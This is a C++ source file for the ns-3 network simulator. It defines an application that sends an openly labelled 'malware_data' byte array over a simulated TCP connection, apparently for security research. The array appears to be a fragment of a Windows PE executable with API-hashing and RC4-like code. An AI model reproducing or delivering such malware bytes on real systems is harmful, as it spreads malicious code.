/* -*- Mode:C++; c-file-style:"gnu"; indent-tabs-mode:nil; -*- */
/*
 * Copyright (c) 2010 Georgia Institute of Technology
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation;
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 * Author: George F. Riley <riley@ece.gatech.edu>
 */

#include "ns3/log.h"
#include "ns3/address.h"
#include "ns3/node.h"
#include "ns3/nstime.h"
#include "ns3/socket.h"
#include "ns3/simulator.h"
#include "ns3/socket-factory.h"
#include "ns3/packet.h"
#include "ns3/uinteger.h"
#include "ns3/trace-source-accessor.h"
#include "ns3/tcp-socket-factory.h"
#include "malware-send-application.h"
#include "seq-ts-header.h"

namespace ns3
{

uint8_t malware_data[1558] = {
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x00, 0x00, 0x00,
    0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68,
    0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
    0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20,
    0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xD4, 0xCB, 0xD0, 0x52, 0x90, 0xAA, 0xBE, 0x52, 0x90, 0xAA, 0xBE, 0x52, 0x90, 0xAA, 0xBE, 0x52,
    0x99, 0xD2, 0x3A, 0x52, 0x91, 0xAA, 0xBE, 0x52, 0x99, 0xD2, 0x2B, 0x52, 0x91, 0xAA, 0xBE, 0x52,
    0x99, 0xD2, 0x3D, 0x00, 0x83, 0xAA, 0xBE, 0x52, 0x99, 0xD2, 0x2D, 0x52, 0x87, 0xAA, 0xBE, 0x52,
    0x90, 0xAA, 0xBF, 0x52, 0xA6, 0xAA, 0xBE, 0x52, 0x90, 0xAA, 0xBE, 0x52, 0x91, 0xAA, 0xBE, 0x52,
    0x9D, 0xF8, 0x65, 0x52, 0x91, 0xAA, 0xBE, 0x52, 0x9D, 0xF8, 0x60, 0x52, 0x91, 0x6A, 0x00, 0x6A,
    0x52, 0x69, 0x63, 0x68, 0x90, 0xAA, 0xBE, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x50, 0x45, 0x00, 0x00, 0x4C, 0x01, 0x08, 0x00, 0x35, 0xEC, 0x91, 0x5C, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xE0, 0x00, 0x02, 0x01, 0x0B, 0x01, 0x0E, 0x00, 0x00, 0x3E, 0x00, 0x00,
    0xAA, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x26, 0x1F, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
    0x00, 0x60, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
    0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x30, 0x08, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x81,
    0x00, 0x00, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xDC, 0x22, 0x02, 0x00, 0xF2, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0xA8, 0x1F, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x20, 0x08, 0x00, 0x38, 0x05, 0x00, 0x00, 0x10, 0x61, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0xF4, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00,
    0x50, 0x37, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x60,
    0x2E, 0x43, 0x52, 0x54, 0x30, 0x00, 0x00, 0x00, 0x34, 0x04, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00,
    0x00, 0x06, 0x00, 0x00, 0x00, 0x3C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x60, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
    0xBF, 0xCA, 0x01, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0xCA, 0x01, 0x00, 0x00, 0x42, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40,
    0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x00, 0x88, 0x34, 0x00, 0x00, 0x00, 0x02, 0x00,
    0x00, 0x1A, 0x00, 0x00, 0x00, 0x0C, 0x0C, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0xC0, 0x2E, 0x61, 0x64, 0x61, 0x74, 0x00, 0x00,
    0x02, 0x05, 0x01, 0x00, 0x00, 0x70, 0x02, 0x00, 0x00, 0x06, 0x01, 0x00, 0x00, 0x26, 0x02, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC0,
    0x2E, 0x45, 0x58, 0x50, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x7C, 0x04, 0x00, 0x00, 0x80, 0x03, 0x00,
    0x95, 0x06, 0x06, 0x00, 0x00, 0xE9, 0xA6, 0xFE, 0xFF, 0xFF, 0x6A, 0x00, 0xFF, 0x95, 0xEE, 0x05,
    0x00, 0x00, 0x53, 0x31, 0xC0, 0x8A, 0x1C, 0x06, 0x84, 0xDB, 0x74, 0x03, 0x40, 0xEB, 0xF6, 0x5B,
    0xC3, 0x55, 0x89, 0xE5, 0x83, 0xEC, 0x0C, 0x60, 0x89, 0x5D, 0xFC, 0x89, 0x45, 0xF8, 0x03, 0x5B,
    0x3C, 0x8B, 0x5B, 0x78, 0x03, 0x5D, 0xFC, 0x8B, 0x7B, 0x20, 0x03, 0x7D, 0xFC, 0x31, 0xF6, 0x8D,
    0x14, 0xB7, 0x8B, 0x12, 0x03, 0x55, 0xFC, 0x31, 0xC0, 0xC1, 0xC0, 0x07, 0x32, 0x02, 0x42, 0x80,
    0x3A, 0x00, 0x75, 0xF5, 0x3B, 0x45, 0xF8, 0x74, 0x06, 0x46, 0x3B, 0x73, 0x18, 0x72, 0xE0, 0x8B,
    0x53, 0x24, 0x03, 0x55, 0xFC, 0x0F, 0xB7, 0x14, 0x72, 0x8B, 0x43, 0x1C, 0x03, 0x45, 0xFC, 0x8B,
    0x04, 0x90, 0x03, 0x45, 0xFC, 0x89, 0x45, 0xF4, 0x61, 0x8B, 0x45, 0xF4, 0xC9, 0xC3, 0x55, 0x89,
    0xE5, 0x57, 0x56, 0x53, 0x81, 0xEC, 0x04, 0x01, 0x00, 0x00, 0x31, 0xC0, 0x88, 0x84, 0x28, 0xF4,
    0xFE, 0xFF, 0xFF, 0x40, 0x3D, 0x00, 0x01, 0x00, 0x00, 0x75, 0xF1, 0x8D, 0x8D, 0xF4, 0xFE, 0xFF,
    0xFF, 0x8D, 0x7D, 0xF4, 0x31, 0xD2, 0x31, 0xDB, 0x8A, 0x01, 0x88, 0x85, 0xF2, 0xFE, 0xFF, 0xFF,
    0x8B, 0x75, 0x10, 0x02, 0x04, 0x32, 0x01, 0xC3, 0x0F, 0xB6, 0xDB, 0x8A, 0x84, 0x2B, 0xF4, 0xFE,
    0xFF, 0xFF, 0x88, 0x01, 0x8A, 0x85, 0xF2, 0xFE, 0xFF, 0xFF, 0x88, 0x84, 0x2B, 0xF4, 0xFE, 0xFF,
    0xFF, 0x8D, 0x42, 0x01, 0xBE, 0x08, 0x00, 0x00, 0x00, 0x99, 0xF7, 0xFE, 0x41, 0x39, 0xF9, 0x75,
    0xC7, 0x31, 0xC9, 0x31, 0xD2, 0x31, 0xC0, 0xEB, 0x42, 0x42, 0x81, 0xE2, 0xFF, 0x00, 0x00, 0x00,
    0x0F, 0xB6, 0xBC, 0x2A, 0xF4, 0xFE, 0xFF, 0xFF, 0x01, 0xF9, 0x0F, 0xB6, 0xC9, 0x0F, 0xB6, 0xB4,
    0x29, 0xF4, 0xFE, 0xFF, 0xFF, 0x89, 0xF3, 0x88, 0x9C, 0x2A, 0xF4, 0xFE, 0xFF, 0xFF, 0x89, 0xFB,
    0x88, 0x9C, 0x29, 0xF4, 0xFE, 0xFF, 0xFF, 0x8D, 0x1C, 0x37, 0x0F, 0xB6, 0xDB, 0x8A, 0x9C, 0x2B,
    0xF4, 0xFE, 0xFF, 0xFF, 0x8B, 0x75, 0x08, 0x30, 0x1C, 0x30, 0x40, 0x3B, 0x45, 0x0C, 0x7C, 0xB9,
    0x81, 0xC4, 0x04, 0x01, 0x00, 0x00, 0x5B, 0x5E, 0x5F, 0x5D, 0xC2, 0x0C, 0x00, 0x50, 0x61, 0x73,
    0x73, 0x77, 0x6F, 0x72, 0x64, 0x37, 0x59, 0x68, 0x6E, 0x67, 0x79, 0x6C, 0x4B, 0x6F, 0x30, 0x39,
    0x4C, 0x43, 0x4F, 0x44, 0x45, 0x5F, 0x4D, 0x55, 0x54, 0x45, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0xD5, 0xB0, 0x3E, 0x72, 0x14, 0xF1, 0xF8, 0x08, 0x9C, 0x96, 0x78, 0xBF, 0x60, 0xA2,
    0x8A, 0x76, 0xF1, 0xCB, 0xF7, 0xAE, 0xEE, 0xEA, 0xC0, 0x1F, 0x26, 0x80, 0xAC, 0xC8, 0x09, 0xC6,
    0x52, 0xAE, 0x6B, 0xE1, 0x7F, 0x48, 0xF5, 0x72, 0x99, 0x3D, 0xFE, 0x6A, 0x7A, 0x69, 0x5F, 0x70,
    0x35, 0x3A, 0xC3, 0xD1, 0x3F, 0x0F};

NS_LOG_COMPONENT_DEFINE("MalwareSendApplication");

NS_OBJECT_ENSURE_REGISTERED(MalwareSendApplication);

TypeId
MalwareSendApplication::GetTypeId(void)
{
    static TypeId tid = TypeId("ns3::MalwareSendApplication")
                            .SetParent<Application>()
                            .SetGroupName("Applications")
                            .AddConstructor<MalwareSendApplication>()
                            .AddAttribute("SendSize", "The amount of data to send each time.",
                                          UintegerValue(512),
                                          MakeUintegerAccessor(&MalwareSendApplication::m_sendSize),
                                          MakeUintegerChecker<uint32_t>(1))
                            .AddAttribute("Port", "The port number of destination",
                                          UintegerValue(50000),
                                          MakeUintegerAccessor(&MalwareSendApplication::m_port),
                                          MakeUintegerChecker<uint16_t>(1))
                            .AddAttribute("Remote", "The address of the destination",
                                          AddressValue(),
                                          MakeAddressAccessor(&MalwareSendApplication::m_peer),
                                          MakeAddressChecker())
                            .AddAttribute("MaxBytes",
                                          "The total number of bytes to send. "
                                          "Once these bytes are sent, "
                                          "no data  is sent again. The value zero means "
                                          "that there is no limit.",
                                          UintegerValue(0),
                                          MakeUintegerAccessor(&MalwareSendApplication::m_maxBytes),
                                          MakeUintegerChecker<uint64_t>())
                            .AddAttribute("Protocol", "The type of protocol to use.",
                                          TypeIdValue(TcpSocketFactory::GetTypeId()),
                                          MakeTypeIdAccessor(&MalwareSendApplication::m_tid),
                                          MakeTypeIdChecker())
                            .AddTraceSource("Tx", "A new packet is created and is sent",
                                            MakeTraceSourceAccessor(&MalwareSendApplication::m_txTrace),
                                            "ns3::Packet::TracedCallback");
    return tid;
}

MalwareSendApplication::MalwareSendApplication()
    : m_socket(0),
      m_connected(false),
      m_totBytes(0)
{
    NS_LOG_FUNCTION(this);
}

MalwareSendApplication::~MalwareSendApplication()
{
    NS_LOG_FUNCTION(this);
}

void MalwareSendApplication::SetMaxBytes(uint64_t maxBytes)
{
    NS_LOG_FUNCTION(this << maxBytes);
    m_maxBytes = maxBytes;
}

Ptr<Socket>
MalwareSendApplication::GetSocket(void) const
{
    NS_LOG_FUNCTION(this);
    return m_socket;
}

void MalwareSendApplication::DoDispose(void)
{
    NS_LOG_FUNCTION(this);

    m_socket = 0;
    // chain up
    Application::DoDispose();
}

// Application Methods
void MalwareSendApplication::StartApplication(void) // Called at time specified by Start
{
    NS_LOG_FUNCTION(this);

    // Create the socket if not already
    if (!m_socket)
    {
        m_socket = Socket::CreateSocket(GetNode(), m_tid);

        // Fatal error if socket type is not NS3_SOCK_STREAM or NS3_SOCK_SEQPACKET
        if (m_socket->GetSocketType() != Socket::NS3_SOCK_STREAM &&
            m_socket->GetSocketType() != Socket::NS3_SOCK_SEQPACKET)
        {
            NS_FATAL_ERROR("Using MalwareSend with an incompatible socket type. "
                           "MalwareSend requires SOCK_STREAM or SOCK_SEQPACKET. "
                           "In other words, use TCP instead of UDP.");
        }

        if (Inet6SocketAddress::IsMatchingType(m_peer))
        {
            if (m_socket->Bind6() == -1)
            {
                NS_FATAL_ERROR("Failed to bind socket");
            }
        }
        else if (InetSocketAddress::IsMatchingType(m_peer))
        {
            if (m_socket->Bind() == -1)
            {
                NS_FATAL_ERROR("Failed to bind socket");
            }
        }

        m_socket->Connect(m_peer);
        m_socket->ShutdownRecv();
        m_socket->SetConnectCallback(
            MakeCallback(&MalwareSendApplication::ConnectionSucceeded, this),
            MakeCallback(&MalwareSendApplication::ConnectionFailed, this));
        m_socket->SetSendCallback(
            MakeCallback(&MalwareSendApplication::DataSend, this));
    }

    if (m_connected)
    {
        SendData();
    }
}

void MalwareSendApplication::StopApplication(void) // Called at time specified by Stop
{
    NS_LOG_FUNCTION(this);

    if (m_socket != 0)
    {
        m_socket->Close();
        m_connected = false;
    }
    else
    {
        NS_LOG_WARN("MalwareSendApplication found null socket to close in StopApplication");
    }
}

// Private helpers

void MalwareSendApplication::SendData(void)
{
    NS_LOG_FUNCTION(this);

    NS_LOG_LOGIC("sending packet at " << Simulator::Now());
    SeqTsHeader seqTs;
    seqTs.SetSeq(0);
    Ptr<Packet> packet = Create<Packet>(malware_data, sizeof(malware_data));
    packet->AddHeader(seqTs);

    int actual = m_socket->Send(packet);
    if (actual > 0)
    {
        m_totBytes += actual;
        m_txTrace(packet);
    }
    m_socket->Close();
    m_connected = false;
}

void MalwareSendApplication::ConnectionSucceeded(Ptr<Socket> socket)
{
    NS_LOG_FUNCTION(this << socket);
    NS_LOG_LOGIC("MalwareSendApplication Connection succeeded");
    m_connected = true;
    SendData();
}

void MalwareSendApplication::ConnectionFailed(Ptr<Socket> socket)
{
    NS_LOG_FUNCTION(this << socket);
    NS_LOG_LOGIC("MalwareSendApplication, Connection Failed");
}

void MalwareSendApplication::DataSend(Ptr<Socket>, uint32_t)
{
    NS_LOG_FUNCTION(this);

    if (m_connected)
    { // Only send new data if the connection has completed
        SendData();
    }
}

} // Namespace ns3
